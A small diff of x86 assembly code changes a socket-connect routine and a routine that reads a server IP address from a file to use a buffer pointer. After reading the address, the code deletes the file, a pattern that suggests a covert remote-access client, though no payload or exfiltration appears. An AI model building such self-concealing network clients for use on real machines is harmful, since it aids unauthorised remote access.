@@ -37,7 +37,7 @@ endp
 
 proc Socket.Connect
 
-        invoke  inet_addr, ip
+        invoke  inet_addr, [ipAddr]
         mov     [server + sockaddr_in.sin_addr], eax
         mov     [server + sockaddr_in.sin_family], AF_INET
         invoke  htons, PORT
@@ -85,7 +85,7 @@ proc Client.ReadIP uses esi edi ebx
         mov     [hFile], eax
         invoke  GetFileSize, [hFile], ebx
         mov     [fileSize], eax
-        invoke  ReadFile, [hFile], ip, [fileSize], ebx, ebx
+        invoke  ReadFile, [hFile],[ipAddr], [fileSize], ebx, ebx
         invoke  CloseHandle, [hFile]
         invoke  DeleteFile, ipFilePath
 
